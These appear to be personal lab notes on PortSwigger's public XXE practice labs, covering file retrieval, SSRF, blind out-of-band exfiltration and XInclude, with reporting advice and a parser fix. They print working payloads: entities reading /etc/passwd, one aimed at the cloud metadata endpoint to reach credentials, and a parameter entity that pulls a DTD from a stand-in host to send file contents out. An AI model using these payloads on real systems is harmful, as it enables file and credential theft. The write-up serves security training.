# Lab notes — XXE (PortSwigger Web Security Academy)

Notes on the [XXE labs](https://portswigger.net/web-security/xxe) — approach over answers. Public
practice labs; safe to write up. Pairs with [XXE methodology](../methodology/xxe.md).

## File retrieval

- The app parses XML you submit (e.g. a stock-check request). Define an external entity and
  reference it where the parsed value is echoed:
  ```xml
  <!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
  <stockCheck><productId>&x;</productId></stockCheck>
  ```
- The file contents come back in the response.

## SSRF via XXE

- Point the entity at an internal URL to make the server request it:
  `<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/...">` — the metadata response is
  reflected. Iterate through the metadata paths to reach credentials.

## Blind XXE (out-of-band)

- No value reflected → confirm via a callback. Host a malicious DTD on your server and pull it in
  with a parameter entity:
  ```xml
  <!DOCTYPE r [ <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/x.dtd"> %dtd; ]>
  ```
  The DTD defines a parameter entity that fetches a URL containing the target file's contents —
  the hit on your listener carries the data.

## When you can't edit the DOCTYPE

- **XInclude:** inject into a value the server places inside its own XML:
  `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
- **File upload:** deliver the XXE inside an SVG or an Office file the server parses.

## Reporting

Show the XML sent, the retrieved file / metadata / OOB callback, and the concrete data reached.
Read only what proves it; use your own OOB listener. Fix: disable DTDs and external entities in
the parser.
